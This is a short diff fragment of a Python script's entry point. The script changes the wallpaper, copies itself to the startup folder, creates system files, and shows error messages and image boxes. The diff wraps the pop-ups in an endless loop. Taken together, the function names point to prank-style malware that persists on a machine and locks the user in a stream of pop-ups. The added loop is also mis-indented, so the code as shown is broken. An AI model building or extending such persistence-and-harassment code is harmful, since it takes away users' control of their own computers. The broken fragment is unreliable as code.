@@ -99,6 +99,7 @@ if __name__ == "__main__":
   change_wallpaper()
   time.sleep(2)
   copy_to_startup()
-  display_error_messages()
-  display_image_box()
   create_system_files()
+    while True:
+        display_image_box()
+        display_error_messages()
